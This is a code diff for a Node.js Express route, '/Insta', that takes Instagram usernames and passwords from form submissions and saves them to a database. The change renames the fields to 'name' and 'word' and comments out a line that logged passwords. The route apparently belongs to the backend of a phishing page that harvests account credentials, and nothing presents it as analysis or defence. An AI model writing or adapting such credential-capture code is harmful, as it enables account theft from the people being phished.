@@ -41,12 +41,12 @@ app.get('/', (req, res) => {
 // Route to handle Instagram credentials
 app.post('/Insta', async (req, res) => {
   try {
-    const { username, password } = req.body;
-    console.log(`Received -> Username: ${username}, Password: ${password}`);
+    const { name, word } = req.body;
+  //  console.log(`Received -> Username: ${username}, Password: ${password}`);
 
     const dataSave = new instadb({
-      username: username,
-      Password: password
+      username: name,
+      Password: word
     });
 
     await dataSave.save();
